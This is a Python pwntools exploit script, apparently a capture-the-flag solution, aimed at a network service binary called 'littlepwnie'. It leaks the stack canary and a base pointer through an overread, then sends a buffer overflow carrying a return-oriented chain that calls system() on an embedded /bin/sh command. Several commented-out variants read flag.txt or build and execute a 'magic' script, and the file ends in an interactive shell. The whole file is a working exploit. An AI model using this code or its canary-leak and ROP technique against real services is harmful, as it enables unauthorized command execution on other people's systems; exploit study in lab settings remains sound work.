from pwn import *

context.binary = "./littlepwnie"

p = process("./littlepwnie")

# gdbscript = """
# set follow-fork-mode child
# # In handle_request
# b *0x4014eb
# c
# """
# gdb.attach(p, gdbscript=gdbscript)

# r = remote("10.0.115.6", 50085)
r = remote("localhost", 50085)

r.send("A"*265)
s = r.recv(264)
print(s)

s = r.recv(8)
canary = unpack("\x00" + s[1:])
print("canary: %x" % canary)

s = r.recv(8)
bp = unpack(s + "\x00"*2)
print("bp: %x" % bp)

# r.send("A"*265)
# s = r.recv(264)
# print(s)

# s = r.recv(8)
# canary = unpack("\x00" + s[1:])
# print("canary: %x" % canary)

# s = r.recv(8)
# print("bp %s"%s)
# canary = unpack("\x00" + s[1:])
# print("%x" % canary)

system_plt = 0x400750
pop_rdi = 0x401ad3
ret = 0x4006ee

# TDOO: calc this dynamically
bin_sh_addr = bp - 976 - 60

rop = flat([
    ret,
    pop_rdi,
    bin_sh_addr,
    system_plt,
])

# payload = ("A"*104 + pack(canary) + "B"*8 + rop + "A"*(80-8-60) +
#         "/bin/sh -c 'echo -n \"echo \" >> magic'\x00")
# payload = ("A"*104 + pack(canary) + "B"*8 + rop + "A"*(80-8-60) +
#         "/bin/sh -c 'cat flag.txt | xargs echo -n >> magic'\x00")
# payload = ("A"*104 + pack(canary) + "B"*8 + rop + "A"*(80-8-60) +
#         "/bin/sh -c 'echo -n \" >> \" >> magic'\x00")
# payload = ("A"*104 + pack(canary) + "B"*8 + rop + "A"*(80-8-60) +
#         "/bin/sh -c 'find / -name magic.gif | xargs echo -n >> magic'\x00")
payload = ("A"*104 + pack(canary) + "B"*8 + rop + "A"*(80-8-60) +
        "/bin/sh -c 'chmod +x ./magic && ./magic'\x00")
print("Payload length: %d" % len(payload))
r.send(payload)

r.interactive()
